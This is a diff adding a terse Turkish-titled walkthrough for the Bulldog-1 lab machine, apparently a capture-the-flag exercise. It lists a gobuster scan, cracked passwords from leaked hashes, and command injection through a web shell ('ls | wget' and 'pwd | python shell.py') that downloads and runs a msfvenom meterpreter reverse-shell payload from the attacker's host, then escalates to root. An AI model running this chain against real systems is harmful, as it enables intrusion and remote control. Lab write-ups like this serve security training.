@@ -1,0 +1,29 @@
+BULLDOG-1 MAKİNE ÇÖZÜMÜ
+1 - IP adresi makine ekranında 192.168.2.130 bulundu.
+2 - gobuster dir -u http://192.168.2.130 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+3 - view-source:http://192.168.2.130:8080/dev/
+Need these password hashes for testing. Django's default is too complex-->
+We'll remove these in prod. It's not like a hacker can do anything with a hash-->
+Team Lead: alan@bulldogindustries.com<br><!--6515229daf8dbdc8b89fed2e60f107433da5f2cb--> : Not found
+Back-up Team Lead: william@bulldogindustries.com<br><br><!--38882f3b81f8f2bc47d9f3119155b05f954892fb--> : Not found
+Front End: malik@bulldogindustries.com<br><!--c6f7e34d5d08ba4a40dd5627508ccb55b425e279--> : Not found
+Front End: kevin@bulldogindustries.com<br><br><!--0e6ae9fe8af1cd4192865ac97ebf6bda414218a9--> : Not found
+Back End: ashley@bulldogindustries.com<br><!--553d917a396414ab99785694afd51df3a8a8a3e0--> : Not found
+Back End: nick@bulldogindustries.com<br><br><!--ddf45997a7e18a25ad5f5cf222da64814dd060d5--> : bulldog
+Database: sarah@bulldogindustries.com<br><!--d8b8dd5e7f000b8dea26ef8428caf38c04466b3e--> : bulldoglover
+nick:bulldog, sarah:bulldoglover
+4 - http://192.168.2.130/admin/
+5 - http://192.168.2.130/dev/shell
+7 - ls | which python
+7 - msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.2.128 LPORT=4444 > shell.py
+8 - cp shell.py /var/www/html
+9 - service apache2 start
+10 - ls | wget 192.168.2.128/shell.py
+11 - pwd | ls
+12 - msfconsole
+13 - use exploit/multi/handler, set payload python/meterpreter/reverse_tcp
+14 - pwd | python shell.py
+15 - cd /home/bulldogadmin/.hiddenadmindirectory
+16 - strings customPermissionApp
+17 - django:SUPERultimatePASSWORDyouCANTget
+18 - sudo su
